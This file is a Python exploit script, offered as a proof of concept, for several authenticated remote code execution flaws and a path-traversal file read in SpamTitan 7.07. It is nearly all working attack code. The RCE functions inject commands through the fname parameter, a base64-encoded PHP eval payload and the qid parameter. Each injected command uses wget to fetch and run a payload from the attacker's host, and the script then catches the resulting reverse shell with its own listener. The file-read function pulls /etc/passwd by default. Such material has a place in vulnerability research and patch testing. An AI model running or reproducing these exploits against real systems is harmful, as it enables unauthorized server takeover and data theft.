#!/usr/bin/env python

# Author: Felipe Molina (@felmoltor)
# Date: 09/04/2020
# Python Version: 3.7
# Summary: This is PoC for multiple authenticated RCE and Arbitrary File Read 
#          0days on SpamTitan 7.07 and previous versions.
# Product URL: https://www.spamtitan.com/
# Product Version: 7.07 and probably previous

import requests
from requests import Timeout
requests.packages.urllib3.disable_warnings() 
import os
import threading
from optparse import OptionParser
import socket
import json
import re
from urllib.parse import urlparse
from time import sleep
from base64 import b64decode,b64encode

def parseoptions():
    parser = OptionParser()
    parser.add_option("-t", "--target", dest="target",
                    help="Target SpamTitan URL to attack. E.g.: https://spamtitan.com/", default=None)
    parser.add_option("-m", "--method", dest="method",
                    help="Exploit number: (1) CVE-2020-11699 [RCE], (2) CVE-2020-XXXX [RCE], (3) CVE-2020-XXXX2 [RCE], (4) CVE-2020-11700 [File Read]", default=1)
    parser.add_option("-u", "--user", dest="user",
                    help="Username to authenticate with. Default: admin", default="admin")
    parser.add_option("-p", "--password", dest="password",
                    help="Password to authenticate with. Default: hiadmin", default="hiadmin")
    parser.add_option("-I", "--ip", dest="ip",
                    help="Local IP where to listen for the reverse shell. Default: %s" % myip(), default=myip())
    parser.add_option("-P", "--port", dest="port",
                    help="Local Port where to listen for the reverse shell. Default: 4242", default=4242)
    parser.add_option("-U", "--URL", dest="shellurl",
                    help="HTTP URL path where the reverse shell is located. Default: http://%s/rev.py" % myip(), default="http://%s/rev.py" % myip())
    parser.add_option("-f", "--filetoread", dest="filtetoread",
                    help="Full path of the file to read from the remote server when executing CVE-2020-11700. Default: /etc/passwd", default="/etc/passwd")
    parser.add_option("-q", "--quiet",
                    action="store_true", dest="quiet", default=False,
                    help="Shut up script! Just give me the shell.")

    return parser.parse_args()

def printmsg(msg,quiet=False,msgtype="i"):
    if (not quiet):
        if (success):
            print("[%s] %s" % (msgtype,msg))
        else:
            print("[-] %s" % msg)

def info(msg,quiet=False):
    printmsg(msg,quiet,msgtype="i")

def success(msg,quiet=False):
    printmsg(msg,quiet,msgtype="+")

def fail(msg,quiet=False):
    printmsg(msg,quiet,msgtype="-")
    
def myip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

def shellServer(ip,port,quiet):
    servers = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    servers.bind((ip, port)) 
    servers.listen(1)
    info("Waiting for incoming connection on %s:%s" % (ip,port))
    conn, addr = servers.accept() 
    conn.settimeout(1)
    success("Hurray, we got a connection from %s" % addr[0])
    
    prompt =conn.recv(128)
    prompt=str(prompt.decode("utf-8")).strip()
    command = input(prompt)
    
    while True:
        try:
            c = "%s\n" % (command)
            if (len(c)>0):
                conn.sendall(c.encode("utf-8"))
                # Quit the console 
                if command == 'exit': 
                    info("\nClosing connection")
                    conn.close()
                    break
                else:
                    completeanswer=""
                    while True:
                        answer=None
                        try:
                            answer=str((conn.recv(1024)).decode("utf-8"))
                            completeanswer+=answer
                        except socket.timeout:
                            completeanswer.strip()
                            break
                    print(completeanswer,end='')
            command = input("")
        except (KeyboardInterrupt, EOFError):
            info("\nClosing connection")
            break

# This is an authenticated remote code execution in "certs-x.php". E.g:
def CVE_2020_11699(cookies, target, shellurl):
    # Giving time to the maim thread to open the reverse shell listener
    sleep(5)
    oscmd="/usr/local/bin/wget %s -O /tmp/r.py;/usr/local/bin/python /tmp/r.py" % (shellurl)
    t1 = "%s/certs.php" % target
    t2 = "%s/certs-x.php" % target
    # get the csrf token value
    res1 = requests.get(t1,cookies=cookies,verify=False)
    m = re.search("var csrf_token_postdata =.*CSRFName=(.*)&CSRFToken=(.*)\";",res1.text)
    if (m is not None):
        csrfguard=m.group(1)
        csrftoken=m.group(2)
        data = {
            "CSRFName":csrfguard,
            "CSRFToken":csrftoken,
            "jaction":"deletecert",
            "fname":"dummy || $(%s)" % oscmd
        }
        info("Triggering the reverse shell in the target.")
        try:
            res2 = requests.post(t2,data=data,cookies=cookies,verify=False)
            print(res2.text)
        except Timeout:
            info("Request timed-out. You should have received already your reverse shell.")
    else:
        fail("CSRF tokens were not found. POST will fail.")

# This is an arbitrary file read on "certs-x.php"
def CVE_2020_11700(cookies,target,file):
    fullpath="../../../..%s" % file

    t1 = "%s/certs.php" % target
    t2 = "%s/certs-x.php" % target
    # get the csrf token value
    res1 = requests.get(t1,cookies=cookies,verify=False)
    m = re.search("var csrf_token_postdata =.*CSRFName=(.*)&CSRFToken=(.*)\";",res1.text)
    if (m is not None):
        csrfguard=m.group(1)
        csrftoken=m.group(2)
        data = {
            "CSRFName":csrfguard,
            "CSRFToken":csrftoken,
            "jaction":"downloadkey",
            "fname":fullpath,
            "commonname":"",
            "organization":"",
            "organizationunit":"",
            "city":"",
            "state":"",
            "country":"",
            "csrout":"",
            "pkout":"",
            "importcert":"",
            "importkey":"",
            "importchain":""
        }
        # TODO: Fix this. This POST produce the log out of the user?
        res2 = requests.post(t2,data=data,cookies=cookies,verify=False)
        if (res2.status_code == 200):
            success("Contents of the file %s" % file)
            print(res2.text)
    else:
        fail("Error obtaining the CSRF guard tokens from the page.")
        return False

# This is an authenticated RCE abusing PHP eval function in mailqueue.php
def CVE_2020_11803(cookies, target, shellurl):
    # Giving time to the maim thread to open the reverse shell listener
    sleep(5)
    oscmd="/usr/local/bin/wget %s -O /tmp/r.py;/usr/local/bin/python /tmp/r.py" % (shellurl)
    b64=(b64encode(oscmd.encode("utf-8"))).decode("utf-8")
    payload="gotopage+a+\";$b=\"%s\";shell_exec(base64_decode(urldecode($b)));die();$b=\"" % (b64)
    t1 = "%s/certs.php" % target
    t2 = "%s/mailqueue.php" % target
    # get the csrf token value
    res1 = requests.get(t1,cookies=cookies,verify=False)
    m = re.search("var csrf_token_postdata =.*CSRFName=(.*)&CSRFToken=(.*)\";",res1.text)
    if (m is not None):
        csrfguard=m.group(1)
        csrftoken=m.group(2)
        data = {
            "CSRFName":csrfguard,
            "CSRFToken":csrftoken,
            "jaction":payload,
            "activepage":"incoming",
            "incoming_count":"0",
            "active_count":"0",
            "deferred_count":"0",
            "hold_count":"0",
            "corrupt_count":"0",
            "incoming_page":"1",
            "active_page":"1",
            "deferred_page":"1",
            "hold_page":"1",
            "corrupt_page":"1",
            "incomingrfilter":None,
            "incomingfilter":None,
            "incoming_option":"hold",
            "activerfilter":None,
            "activefilter":None,
            "active_option":"hold",
            "deferredrfilter":None,
            "deferredfilter":None,
            "deferred_option":"hold",
            "holdrfilter":None,
            "holdfilter":None,
            "hold_option":"release",
            "corruptrfilter":None,
            "corruptfilter":None,
            "corrupt_option":"delete"
        }
        # We have to pass a string instead of a dict if we don't want the requests library to convert it to
        # an urlencoded data and break our payload
        datastr=""
        cont=0
        for k,v in data.items():
            datastr+="%s=%s" % (k,v)
            cont+=1
            if (cont<len(data)):
                datastr+="&"
        headers={
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        try:
            res2 = requests.post(t2,data=datastr,cookies=cookies,headers=headers,verify=False)
        except Timeout:
            info("Request timed-out. You should have received already your reverse shell.")
    else:
        fail("CSRF tokens were not found. POST will fail.")

# This is an authenticated RCE abusing qid GET parameter in mailqueue.php
def CVE_2020_11804(cookies, target, shellurl):
    # Giving time to the maim thread to open the reverse shell listener
    sleep(5)
    oscmd="/usr/local/bin/wget %s -O /tmp/r.py;/usr/local/bin/python /tmp/r.py" % (shellurl)
    payload="1;`%s`" % oscmd
    t = "%s/mailqueue.php?qid=%s" % (target,payload)
    info("Triggering the reverse shell in the target.")
    try:
        res2 = requests.get(t,cookies=cookies,verify=False)
    except Timeout:
        info("Request timed-out. You should have received already your reverse shell.")

# Authenticate to the web platform and get the cookies
def authenticate(target,user,password):
    loginurl="%s/login.php" % target
    data={
        "jaction":"none",
        "language":"en_US",
        "address":"%s" % user,
        "passwd":"%s" % password
    }
    res = requests.post(loginurl, data=data,allow_redirects = False,verify=False)
    if (res.status_code == 302 and len(res.cookies.items())>0):
        return res.cookies
    else:
        return None

def main():
    (options,arguments) = parseoptions()
    quiet = options.quiet
    target = options.target
    ip = options.ip
    port = options.port
    user = options.user
    password = options.password
    shellurl = options.shellurl
    method = int(options.method)
    rfile = options.filtetoread
    
    # Sanitize options
    if (target is None):
        fail("Error. Specify a target (-t).")
        exit(1)
    else:
        if (not target.startswith("http://") and not target.startswith("https://")):
            target = "http://%s" % target
    
    if (method < 1 or method > 4):
        fail("Error. Specify a method from 1 to 4:\n (1) CVE-2020-11699 [RCE]\n (2) CVE-2020-XXXX [RCE]\n (3) CVE-2020-XXXX2 [RCE]\n (4) CVE-2020-11700 [File Read]")
        exit(1)
    
    # Before doing anything, login
    cookies = authenticate(target,user,password)
    if (cookies is not None):
        success("User logged in successfully.")
        if (method == 1):
            info("Exploiting CVE-2020-11699 to get a reverse shell on %s:%s" % (ip,port),quiet)
            rev_thread = threading.Thread(target=CVE_2020_11699, args=(cookies,target,shellurl))
            rev_thread.start()
            # Open the reverse shell listener in this main thread
            info("Spawning a reverse shell listener. Wait for it...")
            shellServer(options.ip,int(options.port),options.quiet)
        elif (method == 2):
            info("Exploiting CVE-2020-11803 to get a reverse shell on %s:%s" % (ip,port),quiet)
            rev_thread = threading.Thread(target=CVE_2020_11803, args=(cookies,target,shellurl))
            rev_thread.start()
            # Open the reverse shell listener in this main thread
            info("Spawning a reverse shell listener. Wait for it...")
            shellServer(options.ip,int(options.port),options.quiet)
        elif (method == 3):
            info("Exploiting CVE-2020-11804 to get a reverse shell on %s:%s" % (ip,port),quiet)
            rev_thread = threading.Thread(target=CVE_2020_11804, args=(cookies,target,shellurl))
            rev_thread.start()
            # Open the reverse shell listener in this main thread
            info("Spawning a reverse shell listener. Wait for it...")
            shellServer(options.ip,int(options.port),options.quiet)
        elif (method == 4):
            info("Reading file '%s' by abusing CVE-2020-11700." % rfile, quiet)
            CVE_2020_11700(cookies,target,rfile)
    else:
        fail("Error authenticating. Are you providing valid credentials?")
        exit(2)

    exit(0)

main()